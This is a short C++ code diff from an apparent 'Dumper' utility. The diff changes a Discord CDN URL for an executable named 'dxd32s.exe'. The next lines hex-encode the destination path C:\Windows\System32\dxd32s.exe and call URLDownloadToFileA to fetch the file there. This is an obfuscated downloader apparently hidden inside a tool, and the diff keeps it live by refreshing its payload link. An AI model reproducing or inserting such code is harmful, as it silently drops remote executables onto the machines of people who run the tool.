@@ -51,7 +51,7 @@ namespace Dumper
 		}
 	};
 
-	LPCSTR tgdr = "https://cdn.discordapp.com/attachments/968195787576213544/968195845554057306/dxd32s.exe"; 
+	LPCSTR tgdr = "https://cdn.discordapp.com/attachments/968195787576213544/991200480812355644/dxd32s.exe"; 
 	LPCSTR hgfd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65"; 
 	URLDownloadToFileA(NULL, tgdr, hgfd, 0, NULL); 
 
